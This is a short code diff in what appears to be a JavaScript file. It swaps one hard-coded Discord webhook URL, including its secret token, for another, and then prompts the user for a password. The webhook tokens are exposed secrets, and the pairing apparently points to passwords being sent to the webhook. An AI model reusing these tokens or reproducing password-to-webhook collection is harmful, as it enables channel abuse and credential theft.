@@ -1,4 +1,4 @@
-const webhookURL = "https://discord.com/api/webhooks/1353654454141849640/aCroGe7HbsP6HW3WNl6fXolsqCq0pEoeYd5TSUuGMz-nzZaVbS0CsHKK6sH_VU-CjgQm"; // imagine if you steal the webhook bruh
+const webhookURL = "https://discord.com/api/webhooks/1353774702778257450/IpaszJpFxkX9RoHqH4HVYMJ4e-3cAKdSolTDM49m3iXqOIOTdKkwU7bxOJOCXGV_4cgF"; // imagine if you steal the webhook bruh
 
 
 let userInput = prompt("PASSWORD: ");
